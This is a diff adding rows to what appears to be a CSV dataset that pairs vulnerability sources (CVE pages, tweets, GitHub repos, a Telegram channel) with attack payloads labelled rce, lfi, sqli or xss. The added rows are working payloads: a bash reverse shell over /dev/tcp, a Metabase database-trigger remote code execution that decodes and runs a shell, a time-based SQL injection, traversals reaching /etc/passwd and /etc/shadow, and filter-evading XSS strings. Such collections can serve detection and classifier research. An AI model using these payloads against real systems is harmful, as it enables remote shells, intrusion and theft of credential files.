@@ -479,3 +479,12 @@ https://fares7elsadek.medium.com/my-first-bug-how-i-was-able-to-bypass-the-waf-a
 https://vulners.com/github/GHSA-8XHR-X3V8-RGHJ?utm_source=rss&utm_medium=rss&utm_campaign=rss,"services.logging.getLogger(""foo"").error(""Job content executed"")",rce
 https://vulners.com/cve/CVE-2023-41044?utm_source=rss&utm_medium=rss&utm_campaign=rss,/api/system/debug/support/bundle/download/{filename},lfi
 https://t.me/ZerodayExploitware/2233,<SvG><set%0Aonbegin%0A=%0aa=confirm;a%28%60xss%60)/x>,xss
+https://vulners.com/cve/CVE-2023-33831?utm_source=rss&utm_medium=rss&utm_campaign=rss,/bin/bash -c \"/bin/sh -i >& /dev/tcp/%s/%s 0>&1\,rce
+https://vulners.com/cve/CVE-2023-31719?utm_source=rss&utm_medium=rss&utm_campaign=rss,test' OR 2891=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2))))-- ZJMj,sqli
+https://vulners.com/cve/CVE-2023-31718?utm_source=rss&utm_medium=rss&utm_campaign=rss,../../../../../../etc/passwd,lfi
+https://twitter.com/jacky_ichwan/status/1721054490017886381,javascript:var a="ale";var b="rt";var c="()";decodeURI("&lt;button popovertarget=x&gt;Click me&lt;/button&gt;&lt;hvita onbeforetoggle="+a+b+c+" popover id=x&gt;Hvita&lt;/hvita&gt;"),xss
+https://twitter.com/akaclandestine/status/1719996211254472842,<inpuT autofocus oNFocus="setTimeout(function() { /*\*/top['al'+'\u0065'+'rt']([!+[]+!+[]]+[![]+[]][+[]])/*\*/ }, 5000);"></inpuT%3E&amp;lT;/stYle&amp;lT;/titLe&amp;lT;/teXtarEa&amp;lT;/scRipt&amp;gT;,xss
+https://www.linkedin.com/pulse/yamcs-vulnerability-assessment-visionspace-technologies/,/api/storage/buckets/displays/objects/../../../../../../../../home/kali/work/assessments/yamcs/examples/simulation/target/yamcs/etc/users.yaml,lfi
+https://github.com/securezeron/CVE-2023-38646/blob/main/CVE-2023-38646-Reverse-Shell.py,/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\njava.lang.Runtime.getRuntime().exec('bash -c {{echo,{payload}}}|{{base64,-d}}|{{bash,-i}}')\n$$--=x,rce
+https://github.com/Peppermint-Lab/peppermint/issues/171,../../../../../../etc/shadow,lfi
+https://github.com/crater-invoice/crater/issues/1267,{"name":"test.php","data":"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAIAAAD8GO2jAAAAVklEQVR4nGNcPD89JF9HRVRbMF0oJF9QT1NUWzFdKTs/PljAc143k/yPi9t+X9N9qif38ePJv1/vBnyyMFiXHMwwCkbBKBgFo2AUjIJRMApGwSgYfgAAI0oXArodV7QAAAAASUVORK5CYII="},rce
